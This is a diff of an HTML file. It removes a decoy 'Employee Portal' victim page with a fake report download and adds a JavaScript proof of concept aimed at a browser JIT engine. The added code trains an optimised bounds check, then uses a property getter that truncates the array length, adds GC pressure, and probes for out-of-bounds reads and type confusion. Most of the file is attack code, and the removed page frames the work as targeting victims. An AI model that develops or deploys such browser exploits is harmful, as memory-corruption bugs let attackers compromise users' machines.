@@ -1,26 +1,121 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Employee Portal</title>
-</head>
-<body>
-    <h2>Internal Employee Dashboard</h2>
-    <p>Welcome back.</p>
+<!doctype html>
+<meta charset="utf-8">
+<pre id="log"></pre>
 
-    <button onclick="downloadLegit()">Download Laporan Resmi</button>
+<script>
 
-    <script>
-        function downloadLegit() {
-            const a = document.createElement('a');
-            a.href = 'data:text/plain;charset=utf-8,Official Company Report';
-            a.download = 'Monthly_Report.pdf';
-            a.click();
-        }
+const log = m => {
+  document.getElementById("log").textContent += m + "\n"
+  console.log(m)
+}
 
-        // Optional: auto download kecil (biar terlihat legitimate activity)
-        window.onload = function() {
-            console.log('[*] Victim page loaded');
-        }
-    </script>
-</body>
-</html>
+// =======================
+// TARGET
+// =======================
+
+function vuln(a, i){
+  // classic JIT assumption: bounds check + element load
+  if(i < a.length){
+    return a[i]
+  }
+  return 0
+}
+
+// wrapper biar inline + optimized
+function trigger(a){
+  return vuln(a, 3)
+}
+
+// =======================
+// TRAINING
+// =======================
+
+function train(){
+  let a = [1.1,2.2,3.3,4.4,5.5]
+
+  for(let i=0;i<100000;i++){
+    trigger(a)
+  }
+
+  return a
+}
+
+// =======================
+// BREAK ASSUMPTION (FOCUSED)
+// =======================
+
+function corrupt(a){
+
+  Object.defineProperty(a, 3, {
+    get(){
+      // 🔥 CRITICAL:
+      // ubah length setelah JIT assume masih panjang
+      a.length = 0
+
+      // optional: GC pressure
+      for(let i=0;i<10;i++)
+        new ArrayBuffer(0x10000)
+
+      return 1.1
+    }
+  })
+
+  return a
+}
+
+// =======================
+// CHECK
+// =======================
+
+function check(a){
+
+  // probe OOB aggressively
+  for(let i=0;i<50;i++){
+    let v = a[a.length + i]
+
+    if(v !== undefined){
+      log("🔥 OOB READ @" + i + " = " + v)
+      return true
+    }
+  }
+
+  return false
+}
+
+// =======================
+// MAIN
+// =======================
+
+function run(){
+
+  log("[*] training...")
+  let base = train()
+
+  log("[*] triggering...")
+
+  for(let i=0;i<10000;i++){
+
+    let arr = corrupt([...base])
+
+    let r = trigger(arr)
+
+    if(typeof r !== "number"){
+      log("⚠ TYPE CONFUSION: " + r)
+      return
+    }
+
+    if(check(arr)){
+      log("⚠ OOB DETECTED")
+      return
+    }
+
+    if(i % 1000 === 0)
+      log("iter " + i)
+  }
+
+  log("[*] done (no bug hit)")
+}
+
+run()
+
+</script>
